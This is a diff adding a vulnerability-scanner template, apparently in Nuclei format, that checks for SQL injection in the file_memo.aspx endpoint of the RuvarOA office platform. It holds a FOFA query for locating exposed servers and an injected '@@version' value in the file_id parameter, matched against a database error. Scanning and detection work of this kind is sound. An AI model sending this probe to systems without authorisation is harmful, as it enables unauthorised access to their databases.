@@ -1,0 +1,25 @@
+id: ruvaroa-file_memo-sqli
+
+info:
+  name: "RuvarOA协同办公平台 file_memo 接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="txt_admin_key"
+      RuvarOA协同办公平台在file_memo接口处理过程中存在SQL注入缺陷，攻击者可通过构造恶意SQL语句实现未授权的数据访问、篡改或删除操作，从而导致数据完整性受损或敏感信息泄露。
+  tags: RuvarOA协同办公平台
+
+http:
+- raw:
+  - |
+    GET /filemanage/file_memo.aspx?file_id=@@version HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'nvarchar'
